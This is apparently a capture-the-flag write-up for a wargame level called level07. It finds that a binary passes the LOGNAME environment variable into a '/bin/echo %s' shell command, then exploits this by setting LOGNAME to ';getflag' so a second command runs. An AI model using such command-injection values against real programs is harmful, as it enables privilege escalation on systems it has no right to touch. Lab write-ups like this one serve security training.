<h1 align="center"> level07 </h1>

```shell
ls -la
```

We have one file:
```level07```

```shell
strings level07
```
The important lines:
```
LOGNAME
/bin/echo %s
```

We can try to modify the env var ```LOGNAME```
```
export LOGNAME="getflag"
```

```
./level07
```
But it print getflag, so the binary print the content of the env var, we can try this:
```
export LOGNAME=";getflag"
```

It print the content of getflag command, it work !
